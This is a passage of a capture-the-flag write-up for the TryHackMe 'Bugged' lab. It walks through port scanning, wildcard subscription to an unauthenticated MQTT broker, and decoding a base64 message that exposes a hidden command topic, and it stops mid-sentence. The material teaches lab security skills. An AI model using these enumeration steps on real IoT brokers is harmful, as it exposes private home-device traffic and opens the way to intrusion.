            "content_html": "<div class=\"post__entry\">\n<p id=\"ee57\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">John</strong> was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?</p>\n<p id=\"a92b\" class=\"zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj\"><strong>Difficulty =</strong> Easy</p>\n<p id=\"c5ce\" class=\"pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Challenges:</strong><span class=\"ly kz\"> Network Analyze, IoT Hacking.</span></p>\n<p id=\"f868\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Beginning start with Rustscan. For scan, we use ‘-a’ flag to specify our target. And we also use ‘-r’ flag to set port ranges.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"dc46\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sak@kali~ rustscan -a <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">232.80</span> -r <span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5000</span><br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| {}  }| { } |{ {_<span class=\"hljs-number\">_</span> {<span class=\"hljs-number\">_</span>   <span class=\"hljs-number\">_</span>}{ {_<span class=\"hljs-number\">_</span>  /  __<span class=\"hljs-number\">_</span>} / {} \\ |  <span class=\"hljs-string\">`| |<br>| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |<br>`</span>-<span class=\"hljs-string\">' `-'</span><span class=\"hljs-string\">`-----'`</span>----<span class=\"hljs-string\">'  `-'</span>  <span class=\"hljs-string\">`----'  `</span>---<span class=\"hljs-string\">' `-'</span>  <span class=\"hljs-string\">`-'`</span>-<span class=\"hljs-string\">' `-'</span><br>The Modern Day Port Scanner.<br>_______________________________________<span class=\"hljs-number\">_</span><br>: https:<span class=\"hljs-regexp\">//gi</span>thub.com/RustScan/RustScan :<br> --------------------------------------<br>🌍HACK THE PLANET🌍<br><br>[~] The config file is expected to be at <span class=\"hljs-string\">\"/home/sak/.rustscan.toml\"</span><br>[~] File limit higher than batch size. Can increase speed by increasing batch size <span class=\"hljs-string\">'-b 1073741716'</span>.<br>Open <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">232.80</span>:<span class=\"hljs-number\">1883</span><br>[~] Starting Script(s)<br>[&gt;] Script to be run Some(<span class=\"hljs-string\">\"nmap -vvv -p {{port}} {{ip}}\"</span>)<br><br>[~] Starting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-regexp\">//nmap</span>.org ) at <span class=\"hljs-number\">2023</span>-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">05</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span> +<span class=\"hljs-number\">06</span><br>Initiating Ping Scan at <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span><br>Scanning <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">232.80</span> [<span class=\"hljs-number\">2</span> ports]<br>Completed Ping Scan at <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">24</span>s elapsed (<span class=\"hljs-number\">1</span> total hosts)<br>Initiating Parallel DNS resolution of <span class=\"hljs-number\">1</span> host. at <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span><br>Completed Parallel DNS resolution of <span class=\"hljs-number\">1</span> host. at <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">30</span>s elapsed<br>DNS resolution of <span class=\"hljs-number\">1</span> IPs took <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">30</span>s. Mode: Async [<span class=\"hljs-comment\">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br>Initiating Connect Scan at <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span><br>Scanning <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">232.80</span> [<span class=\"hljs-number\">1</span> port]<br>Discovered <span class=\"hljs-keyword\">open</span> port <span class=\"hljs-number\">1883</span>/tcp on <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">232.80</span><br>Completed Connect Scan at <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span>, <span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">25</span>s elapsed (<span class=\"hljs-number\">1</span> total ports)<br>Nmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">232.80</span><br>Host is up, received conn-refused (<span class=\"hljs-number\">0</span>.<span class=\"hljs-number\">25</span>s latency).<br>Scanned at <span class=\"hljs-number\">2023</span>-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">05</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">52</span>:<span class=\"hljs-number\">49</span> +<span class=\"hljs-number\">06</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">1</span>s<br><br>PORT     STATE SERVICE REASON<br><span class=\"hljs-number\">1883</span>/tcp <span class=\"hljs-keyword\">open</span>  mqtt    syn-ack</span></pre>\n<p id=\"d3fd\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">It looks like there is 1 a service running. In target machine service ‘MQTT’ is running on TCP port ‘1883’.</p>\n<h2 id=\"2f82\" class=\"zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj\">Basic Information About ‘MQTT’</h2>\n<p id=\"dc0e\" class=\"pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj\" data-selectable-paragraph=\"\">MQTT stands for MQ Telemetry Transport. It is a publish/subscribe, <strong class=\"ly kz\">extremely simple, and lightweight messaging protocol</strong>, designed for constrained devices and low-bandwidth, high-latency, or unreliable networks. The design principles are to minimize network bandwidth and device resource requirements whilst also attempting to ensure reliability and some degree of assurance of delivery. These principles also turn out to make the protocol ideal for the emerging “machine-to-machine” (M2M) or “Internet of Things” world of connected devices, and for mobile applications where bandwidth and battery power are at a premium.</p>\n<p id=\"253d\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong class=\"ly kz\">Default port:</strong> 1883</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"kl km aoc\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:663/0*_zH7lb_3H1yrrcAU.png\" alt=\"Bugged Tryhackme CTF Writeup\" width=\"663\" height=\"534\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n<figcaption class=\"yz za zb kl km zc zd be b bf z dl\" data-selectable-paragraph=\"\">Basic Information About ‘MQTT’</figcaption>\n</figure>\n<p id=\"51f5\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now our second step began here. At this moment we start the Nmap scan to know more about the service that is running on the server.</p>\n<p id=\"3d37\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">For Nmap scan, we use ‘-sV’ flag to know about services &amp; versions. And we use ‘-sC’ flag to default script scan. We also use ‘-p’ flag to specify which port we want to scan.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"ecef\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"> sak@kali~ sudo nmap -sV -sC -p 1883 10.10.232.80<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 13:08 +06<br>Nmap scan report <span class=\"hljs-keyword\">for</span> 10.10.232.80<br>Host is up (0.25s latency).<br><br>PORT     STATE SERVICE                  VERSION<br>1883/tcp open  mosquitto version 2.0.14<br>| mqtt-subscribe: <br>|   Topics and their most recent payloads: <br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/bytes/received/1min: 4410.65<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/publish/sent/5min: 4.71<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/messages/sent/15min: 85.18<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/clients/connected: 2<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/connections/5min: 0.39<br>|     livingroom/speaker: {<span class=\"hljs-string\">\"id\"</span>:15127941740320722645,<span class=\"hljs-string\">\"gain\"</span>:46}<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/messages/sent: 3575<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/sockets/15min: 0.22<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/store/messages/count: 34<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/messages/stored: 34<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/publish/messages/sent: 52<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/clients/active: 2<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/subscriptions/count: 3<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/store/messages/bytes: 369<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/publish/bytes/received: 119484<br>|     storage/thermostat: {<span class=\"hljs-string\">\"id\"</span>:14536458125521088285,<span class=\"hljs-string\">\"temperature\"</span>:23.189959}<br>|     patio/lights: {<span class=\"hljs-string\">\"id\"</span>:8415478818146317759,<span class=\"hljs-string\">\"color\"</span>:<span class=\"hljs-string\">\"WHITE\"</span>,<span class=\"hljs-string\">\"status\"</span>:<span class=\"hljs-string\">\"OFF\"</span>}<br>|     kitchen/toaster: {<span class=\"hljs-string\">\"id\"</span>:9223877754878364611,<span class=\"hljs-string\">\"in_use\"</span>:<span class=\"hljs-literal\">true</span>,<span class=\"hljs-string\">\"temperature\"</span>:156.5998,<span class=\"hljs-string\">\"toast_time\"</span>:210}<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/version: mosquitto version 2.0.14<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/bytes/received: 167321<br>|     frontdeck/camera: {<span class=\"hljs-string\">\"id\"</span>:5624806846270235642,<span class=\"hljs-string\">\"yaxis\"</span>:143.5409,<span class=\"hljs-string\">\"xaxis\"</span>:-37.70204,<span class=\"hljs-string\">\"zoom\"</span>:4.5788803,<span class=\"hljs-string\">\"movement\"</span>:<span class=\"hljs-literal\">false</span>}<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/clients/maximum: 2<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/messages/received: 3524<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/bytes/received/15min: 3970.90<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/retained messages/count: 36<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/bytes/received/5min: 4291.50<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/publish/bytes/sent: 291<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/publish/sent/1min: 21.93<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/sockets/1min: 1.83<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/connections/15min: 0.14<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/connections/1min: 1.83<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/uptime: 2343 seconds<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/sockets/5min: 0.42<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/messages/sent/5min: 95.12<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/messages/sent/1min: 113.75<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/messages/received/5min: 90.41<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/messages/received/1min: 91.82<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/publish/sent/15min: 1.59<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/messages/received/15min: 83.59<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/bytes/sent/5min: 552.51<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/bytes/sent/15min: 398.79<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/load/bytes/sent/1min: 1255.39<br>|     <span class=\"hljs-variable\">$SYS</span>/broker/clients/total: 2<br>|_    <span class=\"hljs-variable\">$SYS</span>/broker/bytes/sent: 16314<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 14.10 seconds</span></pre>\n<p id=\"8551\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">For ferther scan we use ‘mosquitto’ tool. If your device does have not this tool you can install it by this simple command.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"d4fc\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sudo apt-<span class=\"hljs-keyword\">get</span> install mosquitto mosquitto-clients -y</span></pre>\n<p id=\"a423\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we use “mosquitto_sub” and use ‘-t’ flag to specifying the topic and also use ‘-h’ flag to specify the host address. If we give any topic in in ‘-t’ flag then we’ll get information about that topic. But here we want information about all topics. So, on ‘-t’ flag we use the wildcard “#” for this operation.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"7f11\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sak<span class=\"hljs-variable\">@kali</span>~ mosquitto_sub -t <span class=\"hljs-string\">\"#\"</span> -h <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">232.80</span><br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">6303134845423256684</span>,<span class=\"hljs-string\">\"gain\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">45</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">7062282878224178102</span>,<span class=\"hljs-string\">\"color\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"GREEN\"</span></span>,<span class=\"hljs-string\">\"status\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"ON\"</span></span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">5297822194260674402</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">24.360235</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">2860013371319219134</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">24.233936</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">5845551519049790310</span>,<span class=\"hljs-string\">\"gain\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">61</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">14786151255640681934</span>,<span class=\"hljs-string\">\"color\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"RED\"</span></span>,<span class=\"hljs-string\">\"status\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"OFF\"</span></span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">11637714936854629483</span>,<span class=\"hljs-string\">\"in_use\"</span><span class=\"hljs-symbol\">:false</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">158.6413</span>,<span class=\"hljs-string\">\"toast_time\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">207</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">12972826565605654962</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">23.58</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">5464270745344776246</span>,<span class=\"hljs-string\">\"yaxis\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">88.01166</span>,<span class=\"hljs-string\">\"xaxis\"</span><span class=\"hljs-symbol\">:-</span><span class=\"hljs-number\">120.650795</span>,<span class=\"hljs-string\">\"zoom\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">3.0464551</span>,<span class=\"hljs-string\">\"movement\"</span><span class=\"hljs-symbol\">:false</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">3711207335622492878</span>,<span class=\"hljs-string\">\"gain\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">55</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">7536635942787451007</span>,<span class=\"hljs-string\">\"color\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"GREEN\"</span></span>,<span class=\"hljs-string\">\"status\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"OFF\"</span></span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">14890795244202004796</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">23.076757</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">2458810731003226774</span>,<span class=\"hljs-string\">\"in_use\"</span><span class=\"hljs-symbol\">:true</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">144.60513</span>,<span class=\"hljs-string\">\"toast_time\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">251</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">9928724913760140067</span>,<span class=\"hljs-string\">\"gain\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">73</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">6498368860634934991</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">24.349384</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">3598942894745952976</span>,<span class=\"hljs-string\">\"color\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"RED\"</span></span>,<span class=\"hljs-string\">\"status\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"ON\"</span></span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">12888160293013420529</span>,<span class=\"hljs-string\">\"yaxis\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">124.13611</span>,<span class=\"hljs-string\">\"xaxis\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">175.50891</span>,<span class=\"hljs-string\">\"zoom\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">0.9612895</span>,<span class=\"hljs-string\">\"movement\"</span><span class=\"hljs-symbol\">:true</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">7852150045648343267</span>,<span class=\"hljs-string\">\"in_use\"</span><span class=\"hljs-symbol\">:false</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">153.8073</span>,<span class=\"hljs-string\">\"toast_time\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">121</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">17285335294252743187</span>,<span class=\"hljs-string\">\"gain\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">54</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">11505589973457021977</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">23.719482</span>}<br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">16076301308523402932</span>,<span class=\"hljs-string\">\"color\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"RED\"</span></span>,<span class=\"hljs-string\">\"status\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"ON\"</span></span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">7411803660708968315</span>,<span class=\"hljs-string\">\"gain\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">60</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">18348470723758418035</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">23.625862</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">12464564460746554731</span>,<span class=\"hljs-string\">\"in_use\"</span><span class=\"hljs-symbol\">:true</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">150.03351</span>,<span class=\"hljs-string\">\"toast_time\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">297</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">652803559971738546</span>,<span class=\"hljs-string\">\"color\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"GREEN\"</span></span>,<span class=\"hljs-string\">\"status\"</span><span class=\"hljs-symbol\">:<span class=\"hljs-string\">\"ON\"</span></span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">6540437519393488331</span>,<span class=\"hljs-string\">\"temperature\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">23.25789</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">5951090730247747994</span>,<span class=\"hljs-string\">\"yaxis\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">76.82907</span>,<span class=\"hljs-string\">\"xaxis\"</span><span class=\"hljs-symbol\">:-</span><span class=\"hljs-number\">96.71407</span>,<span class=\"hljs-string\">\"zoom\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">1.7843343</span>,<span class=\"hljs-string\">\"movement\"</span><span class=\"hljs-symbol\">:false</span>}<br>{<span class=\"hljs-string\">\"id\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">12233324324560130586</span>,<span class=\"hljs-string\">\"gain\"</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">49</span>}</span></pre>\n<p id=\"80a3\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">In this operation we got something interesting thing:</p>\n<pre id=\"4662\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\">“eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==”</pre>\n<p id=\"66fc\" class=\"xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj\" data-selectable-paragraph=\"\">They asked us, “Can you help him figure out what these weird network communications are?” Yes, got something weird on network communications.</p>\n<p id=\"fedf\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">This is base64 encoded. So, let’s decode this and see what we got.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"74ce\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\"> sak@kali ~ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==\"</span> | <span class=\"hljs-built_in\">base64</span> -d<br><br>{<span class=\"hljs-string\">\"id\"</span>:<span class=\"hljs-string\">\"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d\"</span>,<span class=\"hljs-string\">\"registered_commands\"</span>:[<span class=\"hljs-string\">\"HELP\"</span>,<span class=\"hljs-string\">\"CMD\"</span>,<span class=\"hljs-string\">\"SYS\"</span>],<span class=\"hljs-string\">\"pub_topic\"</span>:<span class=\"hljs-string\">\"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub\"</span>,<span class=\"hljs-string\">\"sub_topic\"</span>:<span class=\"hljs-string\">\"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub\"</span>}%  </span></pre>\n<p id=\"3a0f\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">After decoding there is registered_command and publiser_topic also subscriber_topic.</p>\n<p id=\"75c6\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">In this MQTT model publisher always publish data and the subscriber always receives data but the subscriber can’t tell the publisher or IoT device what to do or what to publish (cause it is precoded). So, there might be a security vulnerability. We have to find out :)</p>\n<p id=\"6e63\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">In decoded section, this publisher topic “U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub” is registered with the commands “HELP”,”CMD”,”SYS”. Let’s check What can do with this stuff.</p>\n<p id=\"297d\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we try to receive data from the publisher. So, We have to start our subscribers. For that use this command.</p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"0853\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">sak<span class=\"hljs-keyword\">@kali</span> ~ mosquitto_sub -t <span class=\"hljs-string\">\"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub\"</span> -h <span class=\"hljs-number\">10.10</span>.<span class=\"hljs-number\">20.204</span></span></pre>\n<p id=\"e29d\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Now we going to simulate the IoT device. For that, 